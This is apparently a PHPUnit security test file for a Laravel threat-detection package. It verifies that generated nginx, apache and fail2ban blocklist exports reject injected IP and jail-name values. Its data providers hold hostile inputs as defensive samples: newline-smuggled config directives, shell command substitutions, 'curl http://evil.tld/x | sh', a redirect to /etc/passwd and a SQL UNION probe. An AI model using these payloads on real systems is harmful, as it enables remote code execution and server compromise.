<?php

namespace JayAnta\ThreatDetection\Tests\Security;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use JayAnta\ThreatDetection\Tests\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;

/**
 * TD-005 — injection into generated nginx, apache and fail2ban output.
 *
 * These exports are different from every other output in the package, because
 * of what consumes them:
 *
 *   export-fail2ban  -> a #!/bin/bash script an operator runs, as root
 *   export-blocklist -> nginx `deny` directives, included into server config
 *   export-blocklist -> apache `Deny from` directives, or .htaccess
 *
 * The IP is interpolated straight into each line. A newline in ip_address
 * becomes a new config directive or a new shell command.
 *
 * Every test here seeds a hostile row *and* a known-good row, and asserts
 * three things: the buffer is not empty, the good address is still emitted in
 * the right shape, and nothing else is. Without the first two a passing test
 * would prove only that the export produced nothing at all — which is how
 * earlier versions of these tests managed to be vacuous.
 */
class ExportInjectionTest extends TestCase
{
    /** The row that must survive every filter. If it stops appearing, the test is lying. */
    private const GOOD_IP = '203.0.113.77';

    protected function setUp(): void
    {
        parent::setUp();

        $this->createThreatLogsTable();
        $this->createExclusionRulesTable();

        config(['threat-detection.enabled' => true, 'cache.default' => 'array']);
    }

    protected function tearDown(): void
    {
        Cache::flush();
        Request::setTrustedProxies([], 0);
        parent::tearDown();
    }

    private function seedIp(string $ip, int $hits = 1): void
    {
        for ($i = 0; $i < $hits; $i++) {
            DB::table('threat_logs')->insert([
                'ip_address' => $ip,
                'url' => 'https://example.com/x',
                'user_agent' => 'Mozilla/5.0',
                'type' => '[middleware] XSS Script Tag',
                'payload' => 'x',
                'threat_level' => 'high',
                'confidence_score' => 90,
                'confidence_label' => 'very_high',
                'action_taken' => 'logged',
                'created_at' => now()->subMinutes($i),
                'updated_at' => now()->subMinutes($i),
            ]);
        }
    }

    /**
     * Artisan::call rather than $this->artisan(...)->run(): the latter returns
     * a PendingCommand that buffers into its own output, which Artisan::output()
     * never sees. That difference silently produced empty exports once already
     * and made every assertion below vacuous.
     */
    private function runCommand(string $command, array $args = []): string
    {
        Artisan::call($command, $args);

        return Artisan::output();
    }

    /**
     * Lines that carry data, with the generated comment header removed.
     *
     * Blank lines are *kept*: a directive emitted for an empty address is the
     * finding in TD-006, and filtering it away is what made one data set
     * assert nothing at all.
     *
     * @return string[]
     */
    private function significantLines(string $output): array
    {
        return array_values(array_filter(
            array_map('trim', explode("\n", trim($output))),
            fn (string $line) => !str_starts_with($line, '#')
                && $line !== ''
                && $line !== 'No IPs match the given filters.'
        ));
    }

    /**
     * The positive control every test in this file runs first.
     *
     * Asserts the command produced output at all, and that the known-good
     * address survived to it. Only then is it meaningful to assert that the
     * hostile value did not.
     */
    private function assertGoodRowSurvived(string $output, string $expectedLinePrefix): void
    {
        $this->assertNotSame('', trim($output), 'the export produced no output at all');

        $lines = $this->significantLines($output);
        $this->assertNotEmpty($lines, 'the export produced only comments, so nothing was actually tested');

        $matching = array_filter($lines, fn ($l) => str_starts_with($l, $expectedLinePrefix));
        $this->assertNotEmpty(
            $matching,
            'the known-good address was not emitted, so this test proves nothing. Lines: ' . json_encode($lines)
        );
    }

    /**
     * Values that break out of a line in at least one of the three consumers.
     *
     * @return array<string, array{0: string}>
     */
    public static function injectionPayloads(): array
    {
        return [
            'newline then nginx directive' => ["1.2.3.4;\ndeny all;"],
            'crlf then nginx directive' => ["1.2.3.4;\r\ndeny all;"],
            'newline then shell command' => ["1.2.3.4\ncurl http://evil.tld/x | sh"],
            'carriage return only' => ["1.2.3.4\rdeny all;"],
            'null byte' => ["1.2.3.4\0deny all;"],
            'shell command substitution' => ['1.2.3.4$(id)'],
            'shell backticks' => ['1.2.3.4`id`'],
            'shell separator' => ['1.2.3.4; id'],
            'shell pipe' => ['1.2.3.4 | sh'],
            'shell and' => ['1.2.3.4 && id'],
            'nginx allow-all' => ['0.0.0.0/0'],
            'apache directive' => ["1.2.3.4\nRequire all granted"],
            'comment escape' => ["1.2.3.4  # x\nallow all;"],
            'leading space' => [' 1.2.3.4'],
            'trailing space' => ['1.2.3.4 '],
            'hostname' => ['evil.tld'],
            'empty value' => [''],
        ];
    }

    // ── can a request put a non-IP into the column? ────────────────────────

    /**
     * The reachability question for the *request* path specifically.
     *
     * Symfony validates every forwarded address with FILTER_VALIDATE_IP and
     * discards what fails, so a spoofed X-Forwarded-For falls back to the
     * trusted REMOTE_ADDR. Trusting all proxies — the configuration a Laravel
     * app behind a load balancer is told to use — does not change that.
     *
     * This passing does not make the export safe. It narrows which writer can
     * reach it: see TD_AUDIT.md for the enumeration of the writers that do not
     * go through Symfony at all.
     */
    #[Test]
    #[DataProvider('injectionPayloads')]
    public function a_spoofed_forwarded_header_cannot_put_a_non_ip_into_the_log(string $payload): void
    {
        Route::middleware('threat-detect')->get('/probe', fn () => response('OK', 200));

        Request::setTrustedProxies(['127.0.0.1', '10.0.0.1'], Request::HEADER_X_FORWARDED_FOR);

        $this->withServerVariables(['REMOTE_ADDR' => '10.0.0.1'])
            ->get('/probe?q=' . urlencode("' UNION SELECT password FROM users--"), ['X-Forwarded-For' => $payload])
            ->assertStatus(200);

        // Positive control: the request was detected, so there is a row to check.
        $this->assertGreaterThan(0, DB::table('threat_logs')->count(), 'nothing was logged, so this proves nothing');

        foreach (DB::table('threat_logs')->pluck('ip_address') as $stored) {
            $this->assertNotSame($payload, $stored, 'a spoofed forwarded header reached ip_address verbatim');
            $this->assertNotFalse(
                filter_var((string) $stored, FILTER_VALIDATE_IP),
                'a non-IP reached ip_address: ' . var_export($stored, true)
            );
        }
    }

    // ── the export boundary ────────────────────────────────────────────────

    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_nginx_export_emits_only_deny_directives_for_valid_addresses(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'nginx']);

        $this->assertGoodRowSurvived($output, 'deny ' . self::GOOD_IP . ';');

        foreach ($this->significantLines($output) as $line) {
            $this->assertMatchesRegularExpression(
                '/^deny [0-9a-fA-F:.]+;/',
                $line,
                'the nginx export emitted a line that is not a deny directive: ' . var_export($line, true)
            );
        }
    }

    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_apache_export_emits_only_deny_directives_for_valid_addresses(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'apache']);

        $this->assertGoodRowSurvived($output, 'Deny from ' . self::GOOD_IP);

        foreach ($this->significantLines($output) as $line) {
            $this->assertMatchesRegularExpression(
                '/^Deny from [0-9a-fA-F:.]+/',
                $line,
                'the apache export emitted a line that is not a Deny directive: ' . var_export($line, true)
            );
        }
    }

    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_fail2ban_export_emits_only_banip_commands_for_valid_addresses(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-fail2ban');

        $this->assertGoodRowSurvived($output, 'fail2ban-client set threat-detection banip ' . self::GOOD_IP);

        foreach ($this->significantLines($output) as $line) {
            $this->assertMatchesRegularExpression(
                '/^fail2ban-client set [A-Za-z0-9_-]+ banip [0-9a-fA-F:.]+\s/',
                $line,
                'the fail2ban export emitted a line that is not a banip command: ' . var_export($line, true)
            );
        }
    }

    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_plain_export_emits_one_valid_address_per_line(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'plain']);

        $this->assertGoodRowSurvived($output, self::GOOD_IP);

        foreach ($this->significantLines($output) as $line) {
            $this->assertNotFalse(
                filter_var($line, FILTER_VALIDATE_IP),
                'the plain export emitted a line that is not an address: ' . var_export($line, true)
            );
        }
    }

    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_fail2ban_plain_export_emits_one_valid_address_per_line(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-fail2ban', ['--format' => 'plain']);

        $this->assertGoodRowSurvived($output, self::GOOD_IP);

        foreach ($this->significantLines($output) as $line) {
            $this->assertNotFalse(
                filter_var($line, FILTER_VALIDATE_IP),
                'the fail2ban plain export emitted a line that is not an address: ' . var_export($line, true)
            );
        }
    }

    /**
     * The blocklist CSV is built by string concatenation rather than fputcsv,
     * so a comma or newline in the address shifts every later column.
     */
    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_blocklist_csv_export_keeps_one_record_per_line(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $output = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'csv']);

        $rows = array_values(array_filter(
            array_map('trim', explode("\n", trim($output))),
            fn ($l) => $l !== '' && !str_starts_with($l, 'ip_address,')
        ));

        $this->assertNotEmpty($rows, 'the CSV export produced no records at all');
        $this->assertContains(
            true,
            array_map(fn ($r) => str_starts_with($r, self::GOOD_IP . ','), $rows),
            'the known-good address is missing from the CSV, so this test proves nothing'
        );

        foreach ($rows as $row) {
            $this->assertMatchesRegularExpression(
                '/^[0-9a-fA-F:.]+,/',
                $row,
                'a CSV record does not start with an address: ' . var_export($row, true)
            );
        }
    }

    /**
     * The API's CSV download is the fifth emission site. It uses fputcsv, so a
     * newline stays inside a quoted field and cannot split the record — but the
     * cell still carries whatever was in the column, to the analyst opening it.
     */
    #[Test]
    #[DataProvider('injectionPayloads')]
    public function the_api_csv_export_emits_only_valid_addresses_in_the_ip_column(string $payload): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp($payload);

        $csv = $this->get('/api/threat-detection/export');
        $csv->assertStatus(200);
        $body = $csv->getContent();

        $this->assertStringContainsString(self::GOOD_IP, $body, 'the known-good address is missing from the export');

        // Parsed as the export is written — RFC 4180, no escape character —
        // which also passes the $escape argument PHP 8.4 requires.
        $rows = array_map(
            fn (string $line) => str_getcsv($line, ',', '"', ''),
            array_filter(explode("\n", trim($body)))
        );
        array_shift($rows); // header

        foreach ($rows as $row) {
            $cell = $row[2] ?? '';

            // Either a real address, or the explicit placeholder. The row is
            // kept — its URL, type and timestamp are still evidence — but the
            // cell never carries something that was not an address, because
            // whatever reads this export may feed that column to a firewall.
            $this->assertTrue(
                filter_var($cell, FILTER_VALIDATE_IP) !== false || $cell === '[INVALID IP]',
                'the API CSV emitted a non-address in the IP column: ' . var_export($cell, true)
            );
            $this->assertStringNotContainsString('deny all', $cell);
            $this->assertStringNotContainsString('$(', $cell);
        }
    }

    // ── TD-006: valid syntax, catastrophic meaning ─────────────────────────

    #[Test]
    public function the_export_never_emits_a_deny_rule_covering_every_address(): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp('0.0.0.0/0');

        $output = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'nginx']);

        $this->assertGoodRowSurvived($output, 'deny ' . self::GOOD_IP . ';');
        $this->assertStringNotContainsString(
            'deny 0.0.0.0/0;',
            $output,
            'the export emitted a rule that denies every client'
        );
    }

    #[Test]
    public function the_export_never_emits_a_directive_with_no_address(): void
    {
        $this->seedIp(self::GOOD_IP);
        $this->seedIp('');

        $nginx = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'nginx']);
        $apache = $this->runCommand('threat-detection:export-blocklist', ['--format' => 'apache']);

        $this->assertGoodRowSurvived($nginx, 'deny ' . self::GOOD_IP . ';');
        $this->assertStringNotContainsString('deny ;', $nginx, 'the export emitted a directive nginx cannot parse');
        $this->assertDoesNotMatchRegularExpression('/Deny from\s{2,}#/', $apache);
    }

    /**
     * Skipping has to be visible. An operator whose blocklist quietly lost
     * entries needs to know, or the export becomes a silent filter.
     */
    #[Test]
    public function a_skipped_row_is_reported_rather_than_dropped_in_silence(): void
    {
        Log::spy();

        $this->seedIp(self::GOOD_IP);
        $this->seedIp("1.2.3.4\ndeny all;");

        $this->runCommand('threat-detection:export-blocklist', ['--format' => 'nginx']);

        Log::shouldHaveReceived('warning')
            ->withArgs(fn ($message) => str_contains($message, 'not a valid IP'))
            ->atLeast()->once();
    }

    // ── the jail name is operator-controlled, and worth stating ────────────

    /**
     * TD-015. --jail is interpolated into a script the operator runs as root.
     *
     * It comes from their own command line, so it is not an attacker input and
     * this is the lowest-severity finding in the audit. It is still worth
     * closing: the output is a root-run script, a jail name is a fail2ban
     * identifier with a known shape, and rejecting anything else costs nothing.
     *
     * @return array<string, array{0: string}>
     */
    public static function malformedJailNames(): array
    {
        return [
            'shell separator' => ['my jail; id'],
            'command substitution' => ['jail$(id)'],
            'backticks' => ['jail`id`'],
            'pipe' => ['jail | sh'],
            'newline' => ["jail\ncurl http://evil.tld | sh"],
            'redirect' => ['jail > /etc/passwd'],
            'space' => ['my jail'],
            'quote' => ["jail'"],
            'empty' => [''],
        ];
    }

    #[Test]
    #[DataProvider('malformedJailNames')]
    public function a_malformed_jail_name_never_reaches_the_generated_script(string $jail): void
    {
        $this->seedIp(self::GOOD_IP);

        $output = $this->runCommand('threat-detection:export-fail2ban', ['--jail' => $jail]);

        // No command line is emitted at all — the run is refused, not escaped.
        $this->assertStringNotContainsString(
            'fail2ban-client set',
            $output,
            'a malformed jail name reached the generated script: ' . var_export($output, true)
        );
        $this->assertStringContainsString('Invalid --jail name', $output);
    }

    /** Positive control: an ordinary jail name is still used verbatim. */
    #[Test]
    public function a_valid_jail_name_is_used_as_given(): void
    {
        $this->seedIp(self::GOOD_IP);

        $output = $this->runCommand('threat-detection:export-fail2ban', ['--jail' => 'my-jail_2']);

        $this->assertStringContainsString(
            'fail2ban-client set my-jail_2 banip ' . self::GOOD_IP,
            $output,
            'a valid jail name was rejected or rewritten'
        );
    }

    #[Test]
    public function the_default_jail_name_is_unchanged(): void
    {
        $this->seedIp(self::GOOD_IP);

        $output = $this->runCommand('threat-detection:export-fail2ban');

        $this->assertStringContainsString('fail2ban-client set threat-detection banip', $output);
    }
}
